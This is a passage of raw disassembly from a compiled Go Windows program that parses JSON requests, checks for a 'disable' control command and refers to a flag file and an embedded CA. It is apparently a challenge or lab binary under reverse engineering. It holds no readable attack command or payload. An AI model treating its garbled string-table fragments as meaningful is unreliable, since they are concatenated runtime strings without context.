   140273245:	e8 b6 31 da ff       	call   0x140016400 <runtime.newobject>
   14027324a:	48 89 84 24 68 01 00 	mov    QWORD PTR [rsp+0x168],rax
   140273251:	00 
   140273252:	48 8b 8c 24 a0 01 00 	mov    rcx,QWORD PTR [rsp+0x1a0]
   140273259:	00 
   14027325a:	48 8b 9c 24 a8 01 00 	mov    rbx,QWORD PTR [rsp+0x1a8]
   140273261:	00 
   140273262:	48 8b 94 24 b0 01 00 	mov    rdx,QWORD PTR [rsp+0x1b0]
   140273269:	00 
   14027326a:	48 8d 3d cf 77 07 00 	lea    rdi,[rip+0x777cf]        # 0x1402eaa40 '\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00~Z\\x9f*\x08\x08\x086\\x80I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00F{\x00\x00\x00\x00\x00\x00\\xc0l2@\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00gdFe\x08\x08\x086\\x80I8@\x01\x00\x00\x00H >@'
   140273271:	48 89 c6             	mov    rsi,rax
   140273274:	48 89 c8             	mov    rax,rcx
   140273277:	48 89 d1             	mov    rcx,rdx
   14027327a:	e8 c1 1c e8 ff       	call   0x1400f4f40 <encoding/json.Unmarshal>
   14027327f:	90                   	nop
   140273280:	48 85 c0             	test   rax,rax
   140273283:	0f 85 aa 02 00 00    	jne    0x140273533
   140273289:	48 8b 94 24 68 01 00 	mov    rdx,QWORD PTR [rsp+0x168]
   140273290:	00 
   140273291:	48 8b 02             	mov    rax,QWORD PTR [rdx]
   140273294:	48 8b 5a 08          	mov    rbx,QWORD PTR [rdx+0x8]
   140273298:	48 8b 4a 10          	mov    rcx,QWORD PTR [rdx+0x10]
   14027329c:	48 8b 7a 18          	mov    rdi,QWORD PTR [rdx+0x18]
   1402732a0:	48 8b 72 20          	mov    rsi,QWORD PTR [rdx+0x20]
   1402732a4:	e8 f7 14 00 00       	call   0x1402747a0 <main.premiere>
   1402732a9:	48 85 c9             	test   rcx,rcx
   1402732ac:	0f 85 54 01 00 00    	jne    0x140273406
   1402732b2:	48 89 5c 24 40       	mov    QWORD PTR [rsp+0x40],rbx
   1402732b7:	48 89 84 24 c0 00 00 	mov    QWORD PTR [rsp+0xc0],rax
   1402732be:	00 
   1402732bf:	90                   	nop
   1402732c0:	e8 5b d9 df ff       	call   0x140070c20 <runtime.makemap_small>
   1402732c5:	48 89 84 24 60 01 00 	mov    QWORD PTR [rsp+0x160],rax
   1402732cc:	00 
   1402732cd:	48 8b 84 24 c0 00 00 	mov    rax,QWORD PTR [rsp+0xc0]
   1402732d4:	00 
   1402732d5:	48 8b 5c 24 40       	mov    rbx,QWORD PTR [rsp+0x40]
   1402732da:	e8 61 d2 df ff       	call   0x140070540 <runtime.convTstring>
   1402732df:	48 89 84 24 58 01 00 	mov    QWORD PTR [rsp+0x158],rax
   1402732e6:	00 
   1402732e7:	48 8d 05 f2 f2 09 00 	lea    rax,[rip+0x9f2f2]        # 0x1403125e0 '\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xa4j^\\xc7\x02\x08\x085\x00\x00\x00\x00\x00\x00\x00\x00H >@\x01\x00\x00\x00\\xaf\x1a\x01\x00\x00\x00\x00\x00\\x80R/@\x01\x00\x00\x00\\xe0,0@\x01\x00\x00\x00\\xe0\\xa91@\x01\x00\x00\x00\\x90I8@\x01\x00\x00\x00\x08\x01\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00'
   1402732ee:	48 8b 9c 24 60 01 00 	mov    rbx,QWORD PTR [rsp+0x160]
   1402732f5:	00 
   1402732f6:	48 8d 0d 16 1d 0f 00 	lea    rcx,[rip+0xf1d16]        # 0x140365013 'outputError:wss://objectnumberstringnetdnsdomaingophertelnetreturn.locallisten.onionip+netsocketacce'
   1402732fd:	bf 06 00 00 00       	mov    edi,0x6
   140273302:	e8 99 5c d9 ff       	call   0x140008fa0 <runtime.mapassign_faststr>
   140273307:	48 8d 0d 72 1f 08 00 	lea    rcx,[rip+0x81f72]        # 0x1402f5280 '\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xb82\\x87\\xf8\x07\x08\x08\x18\\xa8I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00\x03-\x00\x00@\\xbc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x15%\\xbc\x0f\x01\x01\x03\\xb0I8@\x01\x00\x00\x00\\xe82>@'
   14027330e:	48 89 08             	mov    QWORD PTR [rax],rcx
   140273311:	83 3d a8 4a 3e 00 00 	cmp    DWORD PTR [rip+0x3e4aa8],0x0        # 0x140657dc0 ''
   140273318:	75 0a                	jne    0x140273324
   14027331a:	48 8b b4 24 58 01 00 	mov    rsi,QWORD PTR [rsp+0x158]
   140273321:	00 
   140273322:	eb 18                	jmp    0x14027333c
   140273324:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
   140273328:	e8 13 75 e0 ff       	call   0x14007a840 <runtime.gcWriteBarrier2>
   14027332d:	48 8b b4 24 58 01 00 	mov    rsi,QWORD PTR [rsp+0x158]
   140273334:	00 
   140273335:	49 89 33             	mov    QWORD PTR [r11],rsi
   140273338:	49 89 53 08          	mov    QWORD PTR [r11+0x8],rdx
   14027333c:	48 89 70 08          	mov    QWORD PTR [rax+0x8],rsi
   140273340:	48 8b 84 24 80 01 00 	mov    rax,QWORD PTR [rsp+0x180]
   140273347:	00 
   140273348:	48 8b 9c 24 88 01 00 	mov    rbx,QWORD PTR [rsp+0x188]
   14027334f:	00 
   140273350:	48 8d 0d 89 f2 09 00 	lea    rcx,[rip+0x9f289]        # 0x1403125e0 '\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xa4j^\\xc7\x02\x08\x085\x00\x00\x00\x00\x00\x00\x00\x00H >@\x01\x00\x00\x00\\xaf\x1a\x01\x00\x00\x00\x00\x00\\x80R/@\x01\x00\x00\x00\\xe0,0@\x01\x00\x00\x00\\xe0\\xa91@\x01\x00\x00\x00\\x90I8@\x01\x00\x00\x00\x08\x01\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00'
   140273357:	48 8b bc 24 60 01 00 	mov    rdi,QWORD PTR [rsp+0x160]
   14027335e:	00 
   14027335f:	90                   	nop
   140273360:	e8 db 89 ed ff       	call   0x14014bd40 <demand/cmd/artifact/internal/shared.NewSuccessResult>
   140273365:	48 89 84 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rax
   14027336c:	00 
   14027336d:	48 89 9c 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rbx
   140273374:	00 
   140273375:	48 89 8c 24 e0 00 00 	mov    QWORD PTR [rsp+0xe0],rcx
   14027337c:	00 
   14027337d:	48 89 bc 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],rdi
   140273384:	00 
   140273385:	48 89 b4 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rsi
   14027338c:	00 
   14027338d:	4c 89 84 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],r8
   140273394:	00 
   140273395:	4c 89 8c 24 00 01 00 	mov    QWORD PTR [rsp+0x100],r9
   14027339c:	00 
   14027339d:	48 8b 94 24 d0 00 00 	mov    rdx,QWORD PTR [rsp+0xd0]
   1402733a4:	00 
   1402733a5:	48 89 54 24 58       	mov    QWORD PTR [rsp+0x58],rdx
   1402733aa:	0f 10 84 24 d8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xd8]
   1402733b1:	00 
   1402733b2:	0f 11 44 24 60       	movups XMMWORD PTR [rsp+0x60],xmm0
   1402733b7:	0f 10 84 24 e8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xe8]
   1402733be:	00 
   1402733bf:	0f 11 44 24 70       	movups XMMWORD PTR [rsp+0x70],xmm0
   1402733c4:	0f 10 84 24 f8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xf8]
   1402733cb:	00 
   1402733cc:	0f 11 84 24 80 00 00 	movups XMMWORD PTR [rsp+0x80],xmm0
   1402733d3:	00 
   1402733d4:	48 8b 44 24 58       	mov    rax,QWORD PTR [rsp+0x58]
   1402733d9:	48 8b 5c 24 60       	mov    rbx,QWORD PTR [rsp+0x60]
   1402733de:	48 8b 4c 24 68       	mov    rcx,QWORD PTR [rsp+0x68]
   1402733e3:	48 8b 7c 24 70       	mov    rdi,QWORD PTR [rsp+0x70]
   1402733e8:	48 8b 74 24 78       	mov    rsi,QWORD PTR [rsp+0x78]
   1402733ed:	4c 8b 84 24 80 00 00 	mov    r8,QWORD PTR [rsp+0x80]
   1402733f4:	00 
   1402733f5:	4c 8b 8c 24 88 00 00 	mov    r9,QWORD PTR [rsp+0x88]
   1402733fc:	00 
   1402733fd:	48 81 c4 70 01 00 00 	add    rsp,0x170
   140273404:	5d                   	pop    rbp
   140273405:	c3                   	ret
   140273406:	48 8b 49 18          	mov    rcx,QWORD PTR [rcx+0x18]
   14027340a:	48 89 f8             	mov    rax,rdi
   14027340d:	ff d1                	call   rcx
   14027340f:	48 8b 8c 24 80 01 00 	mov    rcx,QWORD PTR [rsp+0x180]
   140273416:	00 
   140273417:	48 89 8c 24 a0 00 00 	mov    QWORD PTR [rsp+0xa0],rcx
   14027341e:	00 
   14027341f:	48 8b 8c 24 88 01 00 	mov    rcx,QWORD PTR [rsp+0x188]
   140273426:	00 
   140273427:	48 89 4c 24 38       	mov    QWORD PTR [rsp+0x38],rcx
   14027342c:	44 0f 11 bc 24 20 01 	movups XMMWORD PTR [rsp+0x120],xmm15
   140273433:	00 00 
   140273435:	44 0f 11 bc 24 30 01 	movups XMMWORD PTR [rsp+0x130],xmm15
   14027343c:	00 00 
   14027343e:	44 0f 11 bc 24 40 01 	movups XMMWORD PTR [rsp+0x140],xmm15
   140273445:	00 00 
   140273447:	48 89 84 24 40 01 00 	mov    QWORD PTR [rsp+0x140],rax
   14027344e:	00 
   14027344f:	48 89 9c 24 48 01 00 	mov    QWORD PTR [rsp+0x148],rbx
   140273456:	00 
   140273457:	48 8d 05 a2 d6 0b 00 	lea    rax,[rip+0xbd6a2]        # 0x140330b00 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00ҩz\\xef\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\x18!>@\x01\x00\x00\x00\\x80\\xc0\x00\x00\\xc0\\xa9\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x0b3@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xa1O\x01\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00\x18\x0b.@'
   14027345e:	48 8d 9c 24 20 01 00 	lea    rbx,[rsp+0x120]
   140273465:	00 
   140273466:	e8 d5 f2 d9 ff       	call   0x140012740 <runtime.convT>
   14027346b:	48 89 c3             	mov    rbx,rax
   14027346e:	48 8d 05 8b d6 0b 00 	lea    rax,[rip+0xbd68b]        # 0x140330b00 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00ҩz\\xef\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\x18!>@\x01\x00\x00\x00\\x80\\xc0\x00\x00\\xc0\\xa9\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x0b3@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xa1O\x01\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00\x18\x0b.@'
   140273475:	e8 46 7b e8 ff       	call   0x1400fafc0 <encoding/json.Marshal>
   14027347a:	48 8b 94 24 a0 00 00 	mov    rdx,QWORD PTR [rsp+0xa0]
   140273481:	00 
   140273482:	48 89 94 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rdx
   140273489:	00 
   14027348a:	48 8b 54 24 38       	mov    rdx,QWORD PTR [rsp+0x38]
   14027348f:	48 89 94 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rdx
   140273496:	00 
   140273497:	48 8d 15 6f 1b 0f 00 	lea    rdx,[rip+0xf1b6f]        # 0x14036500d 'resultoutputError:wss://objectnumberstringnetdnsdomaingophertelnetreturn.locallisten.onionip+netsock'
   14027349e:	48 89 94 24 e0 00 00 	mov    QWORD PTR [rsp+0xe0],rdx
   1402734a5:	00 
   1402734a6:	48 c7 84 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],0x6
   1402734ad:	00 06 00 00 00 
   1402734b2:	48 89 84 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rax
   1402734b9:	00 
   1402734ba:	48 89 9c 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],rbx
   1402734c1:	00 
   1402734c2:	48 89 8c 24 00 01 00 	mov    QWORD PTR [rsp+0x100],rcx
   1402734c9:	00 
   1402734ca:	48 8b 8c 24 d0 00 00 	mov    rcx,QWORD PTR [rsp+0xd0]
   1402734d1:	00 
   1402734d2:	48 89 4c 24 58       	mov    QWORD PTR [rsp+0x58],rcx
   1402734d7:	0f 10 84 24 d8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xd8]
   1402734de:	00 
   1402734df:	0f 11 44 24 60       	movups XMMWORD PTR [rsp+0x60],xmm0
   1402734e4:	0f 10 84 24 e8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xe8]
   1402734eb:	00 
   1402734ec:	0f 11 44 24 70       	movups XMMWORD PTR [rsp+0x70],xmm0
   1402734f1:	0f 10 84 24 f8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xf8]
   1402734f8:	00 
   1402734f9:	0f 11 84 24 80 00 00 	movups XMMWORD PTR [rsp+0x80],xmm0
   140273500:	00 
   140273501:	48 8b 44 24 58       	mov    rax,QWORD PTR [rsp+0x58]
   140273506:	48 8b 5c 24 60       	mov    rbx,QWORD PTR [rsp+0x60]
   14027350b:	48 8b 4c 24 68       	mov    rcx,QWORD PTR [rsp+0x68]
   140273510:	48 8b 7c 24 70       	mov    rdi,QWORD PTR [rsp+0x70]
   140273515:	48 8b 74 24 78       	mov    rsi,QWORD PTR [rsp+0x78]
   14027351a:	4c 8b 84 24 80 00 00 	mov    r8,QWORD PTR [rsp+0x80]
   140273521:	00 
   140273522:	4c 8b 8c 24 88 00 00 	mov    r9,QWORD PTR [rsp+0x88]
   140273529:	00 
   14027352a:	48 81 c4 70 01 00 00 	add    rsp,0x170
   140273531:	5d                   	pop    rbp
   140273532:	c3                   	ret
   140273533:	44 0f 11 bc 24 20 01 	movups XMMWORD PTR [rsp+0x120],xmm15
   14027353a:	00 00 
   14027353c:	44 0f 11 bc 24 30 01 	movups XMMWORD PTR [rsp+0x130],xmm15
   140273543:	00 00 
   140273545:	44 0f 11 bc 24 40 01 	movups XMMWORD PTR [rsp+0x140],xmm15
   14027354c:	00 00 
   14027354e:	48 8d 0d 07 a5 0f 00 	lea    rcx,[rip+0xfa507]        # 0x14036da5c 'request payload is invalidinvalid flag file size: %dfailed to load embedded CAreflect.Value.CanInter'
   140273555:	48 89 8c 24 40 01 00 	mov    QWORD PTR [rsp+0x140],rcx
   14027355c:	00 
   14027355d:	48 c7 84 24 48 01 00 	mov    QWORD PTR [rsp+0x148],0x1a
   140273564:	00 1a 00 00 00 
   140273569:	48 8d 05 90 d5 0b 00 	lea    rax,[rip+0xbd590]        # 0x140330b00 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00ҩz\\xef\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\x18!>@\x01\x00\x00\x00\\x80\\xc0\x00\x00\\xc0\\xa9\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x0b3@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xa1O\x01\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00\x18\x0b.@'
   140273570:	48 8d 9c 24 20 01 00 	lea    rbx,[rsp+0x120]
   140273577:	00 
   140273578:	e8 c3 f1 d9 ff       	call   0x140012740 <runtime.convT>
   14027357d:	48 89 c3             	mov    rbx,rax
   140273580:	48 8d 05 79 d5 0b 00 	lea    rax,[rip+0xbd579]        # 0x140330b00 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00ҩz\\xef\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\x18!>@\x01\x00\x00\x00\\x80\\xc0\x00\x00\\xc0\\xa9\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x0b3@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xa1O\x01\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00\x18\x0b.@'
   140273587:	e8 34 7a e8 ff       	call   0x1400fafc0 <encoding/json.Marshal>
   14027358c:	44 0f 11 bc 24 d0 00 	movups XMMWORD PTR [rsp+0xd0],xmm15
   140273593:	00 00 
   140273595:	44 0f 11 bc 24 d8 00 	movups XMMWORD PTR [rsp+0xd8],xmm15
   14027359c:	00 00 
   14027359e:	44 0f 11 bc 24 e8 00 	movups XMMWORD PTR [rsp+0xe8],xmm15
   1402735a5:	00 00 
   1402735a7:	44 0f 11 bc 24 f8 00 	movups XMMWORD PTR [rsp+0xf8],xmm15
   1402735ae:	00 00 
   1402735b0:	48 8d 15 56 1a 0f 00 	lea    rdx,[rip+0xf1a56]        # 0x14036500d 'resultoutputError:wss://objectnumberstringnetdnsdomaingophertelnetreturn.locallisten.onionip+netsock'
   1402735b7:	48 89 94 24 e0 00 00 	mov    QWORD PTR [rsp+0xe0],rdx
   1402735be:	00 
   1402735bf:	48 c7 84 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],0x6
   1402735c6:	00 06 00 00 00 
   1402735cb:	48 89 84 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rax
   1402735d2:	00 
   1402735d3:	48 89 9c 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],rbx
   1402735da:	00 
   1402735db:	48 89 8c 24 00 01 00 	mov    QWORD PTR [rsp+0x100],rcx
   1402735e2:	00 
   1402735e3:	48 8b 8c 24 d0 00 00 	mov    rcx,QWORD PTR [rsp+0xd0]
   1402735ea:	00 
   1402735eb:	48 89 4c 24 58       	mov    QWORD PTR [rsp+0x58],rcx
   1402735f0:	0f 10 84 24 d8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xd8]
   1402735f7:	00 
   1402735f8:	0f 11 44 24 60       	movups XMMWORD PTR [rsp+0x60],xmm0
   1402735fd:	0f 10 84 24 e8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xe8]
   140273604:	00 
   140273605:	0f 11 44 24 70       	movups XMMWORD PTR [rsp+0x70],xmm0
   14027360a:	0f 10 84 24 f8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xf8]
   140273611:	00 
   140273612:	0f 11 84 24 80 00 00 	movups XMMWORD PTR [rsp+0x80],xmm0
   140273619:	00 
   14027361a:	48 8b 44 24 58       	mov    rax,QWORD PTR [rsp+0x58]
   14027361f:	48 8b 5c 24 60       	mov    rbx,QWORD PTR [rsp+0x60]
   140273624:	48 8b 4c 24 68       	mov    rcx,QWORD PTR [rsp+0x68]
   140273629:	48 8b 7c 24 70       	mov    rdi,QWORD PTR [rsp+0x70]
   14027362e:	48 8b 74 24 78       	mov    rsi,QWORD PTR [rsp+0x78]
   140273633:	4c 8b 84 24 80 00 00 	mov    r8,QWORD PTR [rsp+0x80]
   14027363a:	00 
   14027363b:	4c 8b 8c 24 88 00 00 	mov    r9,QWORD PTR [rsp+0x88]
   140273642:	00 
   140273643:	48 81 c4 70 01 00 00 	add    rsp,0x170
   14027364a:	5d                   	pop    rbp
   14027364b:	c3                   	ret
   14027364c:	48 83 fa 07          	cmp    rdx,0x7
   140273650:	0f 85 6d 01 00 00    	jne    0x1402737c3
   140273656:	81 3e 64 69 73 61    	cmp    DWORD PTR [rsi],0x61736964
   14027365c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
   140273660:	0f 85 5d 01 00 00    	jne    0x1402737c3
   140273666:	66 81 7e 04 62 6c    	cmp    WORD PTR [rsi+0x4],0x6c62
   14027366c:	0f 85 51 01 00 00    	jne    0x1402737c3
   140273672:	80 7e 06 65          	cmp    BYTE PTR [rsi+0x6],0x65
   140273676:	0f 85 47 01 00 00    	jne    0x1402737c3
   14027367c:	4c 89 d0             	mov    rax,r10
   14027367f:	48 8d 1d 2a d0 38 00 	lea    rbx,[rip+0x38d02a]        # 0x1406006b0 '@\\>@\x01\x00\x00\x00\\xd0\x06`@\x01\x00\x00\x00\\xd0Z>@\x01\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\\xfe\\x826@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@\x01\x00\x00\x00\x00\x07`@\x01\x00\x00\x00\\x80\\>@\x01\x00\x00\x00 ye@\x01\x00\x00\x00.\\x836@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@'
   140273686:	e8 b5 99 d9 ff       	call   0x14000d040 <runtime.chansend1>
   14027368b:	48 8b 0d 1e d0 38 00 	mov    rcx,QWORD PTR [rip+0x38d01e]        # 0x1406006b0 '@\\>@\x01\x00\x00\x00\\xd0\x06`@\x01\x00\x00\x00\\xd0Z>@\x01\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\\xfe\\x826@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@\x01\x00\x00\x00\x00\x07`@\x01\x00\x00\x00\\x80\\>@\x01\x00\x00\x00 ye@\x01\x00\x00\x00.\\x836@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@'
   140273692:	48 8b 05 1f d0 38 00 	mov    rax,QWORD PTR [rip+0x38d01f]        # 0x1406006b8 '\\xd0\x06`@\x01\x00\x00\x00\\xd0Z>@\x01\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\\xfe\\x826@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@\x01\x00\x00\x00\x00\x07`@\x01\x00\x00\x00\\x80\\>@\x01\x00\x00\x00 ye@\x01\x00\x00\x00.\\x836@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@\x01\x00\x00\x00 \x07`@'
   140273699:	48 8b 49 18          	mov    rcx,QWORD PTR [rcx+0x18]
   14027369d:	ff d1                	call   rcx
   14027369f:	48 8b 8c 24 88 01 00 	mov    rcx,QWORD PTR [rsp+0x188]
   1402736a6:	00 
   1402736a7:	48 89 4c 24 28       	mov    QWORD PTR [rsp+0x28],rcx
   1402736ac:	48 8b 8c 24 80 01 00 	mov    rcx,QWORD PTR [rsp+0x180]
   1402736b3:	00 
   1402736b4:	48 89 8c 24 90 00 00 	mov    QWORD PTR [rsp+0x90],rcx
   1402736bb:	00 
   1402736bc:	44 0f 11 bc 24 20 01 	movups XMMWORD PTR [rsp+0x120],xmm15
   1402736c3:	00 00 
   1402736c5:	44 0f 11 bc 24 30 01 	movups XMMWORD PTR [rsp+0x130],xmm15
   1402736cc:	00 00 
   1402736ce:	44 0f 11 bc 24 40 01 	movups XMMWORD PTR [rsp+0x140],xmm15
   1402736d5:	00 00 
   1402736d7:	48 89 84 24 40 01 00 	mov    QWORD PTR [rsp+0x140],rax
   1402736de:	00 
   1402736df:	48 89 9c 24 48 01 00 	mov    QWORD PTR [rsp+0x148],rbx
   1402736e6:	00 
   1402736e7:	48 8d 05 12 d4 0b 00 	lea    rax,[rip+0xbd412]        # 0x140330b00 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00ҩz\\xef\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\x18!>@\x01\x00\x00\x00\\x80\\xc0\x00\x00\\xc0\\xa9\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x0b3@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xa1O\x01\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00\x18\x0b.@'
   1402736ee:	48 8d 9c 24 20 01 00 	lea    rbx,[rsp+0x120]
   1402736f5:	00 
   1402736f6:	e8 45 f0 d9 ff       	call   0x140012740 <runtime.convT>
   1402736fb:	48 89 c3             	mov    rbx,rax
   1402736fe:	48 8d 05 fb d3 0b 00 	lea    rax,[rip+0xbd3fb]        # 0x140330b00 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00ҩz\\xef\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\x18!>@\x01\x00\x00\x00\\x80\\xc0\x00\x00\\xc0\\xa9\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x0b3@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xa1O\x01\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00\x18\x0b.@'
   140273705:	e8 b6 78 e8 ff       	call   0x1400fafc0 <encoding/json.Marshal>
   14027370a:	48 8b 94 24 90 00 00 	mov    rdx,QWORD PTR [rsp+0x90]
   140273711:	00 
   140273712:	48 89 94 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rdx
   140273719:	00 
   14027371a:	48 8b 54 24 28       	mov    rdx,QWORD PTR [rsp+0x28]
   14027371f:	48 89 94 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rdx
   140273726:	00 
   140273727:	48 8d 15 df 18 0f 00 	lea    rdx,[rip+0xf18df]        # 0x14036500d 'resultoutputError:wss://objectnumberstringnetdnsdomaingophertelnetreturn.locallisten.onionip+netsock'
   14027372e:	48 89 94 24 e0 00 00 	mov    QWORD PTR [rsp+0xe0],rdx
   140273735:	00 
   140273736:	48 c7 84 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],0x6
   14027373d:	00 06 00 00 00 
   140273742:	48 89 84 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rax
   140273749:	00 
   14027374a:	48 89 9c 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],rbx
   140273751:	00 
   140273752:	48 89 8c 24 00 01 00 	mov    QWORD PTR [rsp+0x100],rcx
   140273759:	00 
   14027375a:	48 8b 8c 24 d0 00 00 	mov    rcx,QWORD PTR [rsp+0xd0]
   140273761:	00 
   140273762:	48 89 4c 24 58       	mov    QWORD PTR [rsp+0x58],rcx
   140273767:	0f 10 84 24 d8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xd8]
   14027376e:	00 
   14027376f:	0f 11 44 24 60       	movups XMMWORD PTR [rsp+0x60],xmm0
   140273774:	0f 10 84 24 e8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xe8]
   14027377b:	00 
   14027377c:	0f 11 44 24 70       	movups XMMWORD PTR [rsp+0x70],xmm0
   140273781:	0f 10 84 24 f8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xf8]
   140273788:	00 
   140273789:	0f 11 84 24 80 00 00 	movups XMMWORD PTR [rsp+0x80],xmm0
   140273790:	00 
   140273791:	48 8b 44 24 58       	mov    rax,QWORD PTR [rsp+0x58]
   140273796:	48 8b 5c 24 60       	mov    rbx,QWORD PTR [rsp+0x60]
   14027379b:	48 8b 4c 24 68       	mov    rcx,QWORD PTR [rsp+0x68]
   1402737a0:	48 8b 7c 24 70       	mov    rdi,QWORD PTR [rsp+0x70]
   1402737a5:	48 8b 74 24 78       	mov    rsi,QWORD PTR [rsp+0x78]
   1402737aa:	4c 8b 84 24 80 00 00 	mov    r8,QWORD PTR [rsp+0x80]
   1402737b1:	00 
   1402737b2:	4c 8b 8c 24 88 00 00 	mov    r9,QWORD PTR [rsp+0x88]
   1402737b9:	00 
   1402737ba:	48 81 c4 70 01 00 00 	add    rsp,0x170
   1402737c1:	5d                   	pop    rbp
   1402737c2:	c3                   	ret
   1402737c3:	48 8b 8c 24 80 01 00 	mov    rcx,QWORD PTR [rsp+0x180]
   1402737ca:	00 
   1402737cb:	48 89 8c 24 50 01 00 	mov    QWORD PTR [rsp+0x150],rcx
   1402737d2:	00 
   1402737d3:	44 0f 11 bc 24 20 01 	movups XMMWORD PTR [rsp+0x120],xmm15
   1402737da:	00 00 
   1402737dc:	44 0f 11 bc 24 30 01 	movups XMMWORD PTR [rsp+0x130],xmm15
   1402737e3:	00 00 
   1402737e5:	44 0f 11 bc 24 40 01 	movups XMMWORD PTR [rsp+0x140],xmm15
   1402737ec:	00 00 
   1402737ee:	48 8d 0d 54 be 0f 00 	lea    rcx,[rip+0xfbe54]        # 0x14036f649 'unsupported control operationmismatched local address typeexec: Wait was already calledoperation alr'
   1402737f5:	48 89 8c 24 40 01 00 	mov    QWORD PTR [rsp+0x140],rcx
   1402737fc:	00 
   1402737fd:	48 c7 84 24 48 01 00 	mov    QWORD PTR [rsp+0x148],0x1d
   140273804:	00 1d 00 00 00 
